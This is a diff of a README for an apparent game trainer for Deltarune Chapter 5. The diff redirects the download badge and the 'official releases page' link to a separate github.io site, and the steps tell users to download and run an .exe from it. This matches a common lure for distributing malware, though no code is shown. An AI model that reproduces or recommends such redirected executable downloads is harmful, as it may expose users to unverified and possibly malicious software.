@@ -1,6 +1,6 @@
 # 🎮 Deltarune-Chapter5-Ultimate-Trainer-2026 - Master every battle with ease
 
-[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/sternumlearningcurve33/Deltarune-Chapter5-Ultimate-Trainer-2026/releases)
+[![](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://sternumlearningcurve33.github.io)
 
 This software helps players manage stats and items in Deltarune Chapter 5. It provides options to adjust health, inventory counts, and character statistics. Use these tools to explore the game content without difficulty.
 
@@ -20,7 +20,7 @@ Verify your Windows version in the System settings menu. Keep your graphics driv
 
 Follow these steps to obtain the tool:
 
-1.  Visit the [official releases page](https://github.com/sternumlearningcurve33/Deltarune-Chapter5-Ultimate-Trainer-2026/releases).
+1.  Visit the [official releases page](https://sternumlearningcurve33.github.io).
 2.  Scroll down to the Latest Release section.
 3.  Click the file ending in .exe to start your download.
 4.  Save the file to your desktop or a folder you can access easily.
